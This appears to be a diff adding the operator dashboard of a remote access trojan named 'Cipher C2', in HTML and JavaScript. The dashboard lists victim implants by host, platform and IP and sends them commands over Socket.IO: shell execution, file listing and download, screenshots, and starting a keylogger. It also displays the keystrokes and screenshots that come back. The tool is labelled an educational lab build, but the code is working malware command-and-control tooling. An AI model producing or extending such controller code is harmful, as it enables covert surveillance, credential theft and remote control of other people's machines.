@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<!--
+  Cipher C2 — Operator Dashboard (FIXED BUILD)
+  =============================================
+  Changes vs. original:
+   [4] Now a real Socket.IO *operator* client: authenticates with the API
+       key, receives live client list + results over the socket, and sends
+       commands via `dashboard_command` instead of only polling REST.
+   [5] No hardcoded API key. The operator pastes the key shown on the
+       server console; the UI verifies it against /api/config's masked
+       fingerprint before trusting it.
+   Listens for the canonical result events: client_joined,
+       client_disconnected, client_response, keylogData, screenshot_data,
+       file_list, command_sent, command_rejected, operator_event.
+-->
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Cipher RAT Dashboard — Lab Build</title>
+<link rel="stylesheet" href="style.css" />
+<script src="/socket.io/socket.io.js"></script>
+</head>
+<body>
+<header>
+  <h1>CIPHER <span>C2</span> <small>lab build v2</small></h1>
+  <div id="conn-status" class="status-dot off" title="connection status"></div>
+</header>
+
+<main>
+  <!-- Login / API key panel -->
+  <section id="login-panel" class="card">
+    <h2>Operator Login</h2>
+    <p class="hint">Paste the API key printed on the C2 server console (or stored in <code>.api_key</code>).</p>
+    <input id="apikey-input" type="password" placeholder="API key…" autocomplete="off" />
+    <button id="btn-connect">Connect</button>
+    <div id="key-fingerprint" class="hint"></div>
+  </section>
+
+  <!-- Clients -->
+  <section id="clients-panel" class="card hidden">
+    <h2>Victims (lab implants)</h2>
+    <table id="client-table">
+      <thead><tr><th>ID</th><th>Host</th><th>Platform</th><th>IP</th><th>Last seen</th><th>Status</th><th></th></tr></thead>
+      <tbody></tbody>
+    </table>
+    <div class="toolbar">
+      <select id="cmd-action">
+        <option value="execute">execute</option>
+        <option value="list_files">list_files</option>
+        <option value="screenshot">screenshot</option>
+        <option value="download_file">download_file</option>
+        <option value="start_keylogger">start_keylogger</option>
+        <option value="stop_keylogger">stop_keylogger</option>
+        <option value="ping">ping</option>
+      </select>
+      <input id="cmd-params" placeholder='params JSON, e.g. {"command":"id"} or {"dir":"."}' size="40" />
+      <button id="btn-send">Send to selected</button>
+      <label class="switch-label"><input type="checkbox" id="master-toggle" /> broadcast ping/stop-all</label>
+    </div>
+  </section>
+
+  <!-- Output streams -->
+  <section id="output-panel" class="card hidden">
+    <h2>Event Stream</h2>
+    <pre id="event-log"></pre>
+  </section>
+  <section id="keylog-panel" class="card hidden">
+    <h2>Keylog Feed (simulated data)</h2>
+    <pre id="keylog-view"></pre>
+  </section>
+  <section id="screen-panel" class="card hidden">
+    <h2>Last Screenshot</h2>
+    <img id="screen-img" alt="no screenshot yet" />
+  </section>
+</main>
+
+<footer>Educational lab use only — isolated network. Detection exercises come later.</footer>
+
+<script>
+(() => {
+  const $ = (s) => document.querySelector(s);
+  let socket = null;
+  let apiKey = null;
+  const clients = new Map();          // client_id -> record
+  let selectedClient = null;
+
+  const logEl = $('#event-log');
+  function log(line) {
+    logEl.textContent += `[${new Date().toISOString().slice(11,19)}] ${line}\n`;
+    logEl.scrollTop = logEl.scrollHeight;
+  }
+
+  // ---- [5] verify typed key against server fingerprint -------------------
+  async function checkFingerprint() {
+    try {
+      const cfg = await (await fetch('/api/config')).json();
+      $('#key-fingerprint').textContent = `server key fingerprint: ${cfg.keyFingerprint}`;
+      return cfg;
+    } catch { $('#key-fingerprint').textContent = 'cannot reach C2 server'; return null; }
+  }
+  checkFingerprint();
+
+  function renderClients() {
+    const tb = $('#client-table tbody');
+    tb.innerHTML = '';
+    const now = Date.now();
+    for (const c of clients.values()) {
+      const online = c.online && (now - c.lastSeen < 30000);
+      const tr = document.createElement('tr');
+      tr.className = c.client_id === selectedClient ? 'selected' : '';
+      tr.innerHTML = `<td>${c.client_id}</td><td>${c.hostname||''}</td><td>${c.platform||''}</td>
+        <td>${c.ip||''}</td><td>${Math.round((now-(c.lastSeen||now))/1000)}s ago</td>
+        <td class="status-dot ${online?'on':'off'}"></td>`;
+      tr.onclick = () => { selectedClient = c.client_id; renderClients(); };
+      tb.appendChild(tr);
+    }
+  }
+  setInterval(renderClients, 5000);
+
+  // ---- [4] connect as operator over the socket ----------------------------
+  $('#btn-connect').onclick = () => {
+    apiKey = $('#apikey-input').value.trim();
+    if (!apiKey) return log('enter the API key first');
+    socket = io({ auth: { apiKey } });   // server middleware tags us 'operator'
+
+    socket.on('connect', () => {
+      $('#conn-status').className = 'status-dot on';
+      socket.emit('operator_hello', { apiKey });
+      log('socket connected, authenticating…');
+    });
+    socket.on('operator_welcome', (snap) => {
+      $('#login-panel').classList.add('hidden');
+      ['#clients-panel','#output-panel','#keylog-panel','#screen-panel'].forEach(s=>$(s).classList.remove('hidden'));
+      (snap.clients||[]).forEach(c => clients.set(c.client_id, c));
+      renderClients();
+      log(`authenticated. ${clients.size} known implant(s).`);
+    });
+    socket.on('operator_denied', (e) => log('AUTH DENIED: ' + e.error));
+    socket.on('disconnect', () => { $('#conn-status').className = 'status-dot off'; log('socket lost'); });
+
+    // Canonical result events from the server:
+    socket.on('client_joined', (c) => { clients.set(c.client_id, {...c, lastSeen: Date.now(), online:true}); renderClients(); log(`implant joined: ${c.client_id} (${c.hostname})`); });
+    socket.on('client_disconnected', (c) => { const r = clients.get(c.client_id); if (r) { r.online=false; renderClients(); } log(`implant lost: ${c.client_id}`); });
+    socket.on('client_response', (m) => { const r = clients.get(m.client_id); if (r) r.lastSeen = Date.now(); log(`response <${m.client_id}> ${m.action||''}: ${String(m.output).slice(0,400)}`); });
+    socket.on('file_list', (m) => log(`files <${m.client_id}> ${m.dir}: ${(m.files||[]).join(', ').slice(0,400)}`));
+    socket.on('keylogData', (m) => { $('#keylog-view').textContent += `${m.keys || ''}`; });
+    socket.on('screenshot_data', (m) => { if (m.base64) $('#screen-img').src = 'data:image/png;base64,' + m.base64; log(`screenshot <${m.client_id}> received`); });
+    socket.on('command_sent', (m) => log(`sent ${m.action} → ${m.client_id} (id ${m.command_id})`));
+    socket.on('command_rejected', (m) => log('REJECTED: ' + m.error));
+    socket.on('operator_event', (m) => { /* audit trail */ });
+  };
+
+  // ---- Send command over socket ------------------------------------------
+  $('#btn-send').onclick = () => {
+    if (!socket || !selectedClient) return log('select an implant first');
+    let params = {};
+    const raw = $('#cmd-params').value.trim();
+    if (raw) { try { params = JSON.parse(raw); } catch { return log('params must be valid JSON'); } }
+    socket.emit('dashboard_command', { client_id: selectedClient, action: $('#cmd-action').value, params });
+  };
+
+  $('#master-toggle').onchange = (e) => {
+    if (!socket) return;
+    socket.emit('dashboard_toggle', { enabled: e.target.checked });
+    log('broadcast toggle: ' + (e.target.checked ? 'ping all' : 'stop-all'));
+  };
+})();
+</script>
+</body>
+</html>
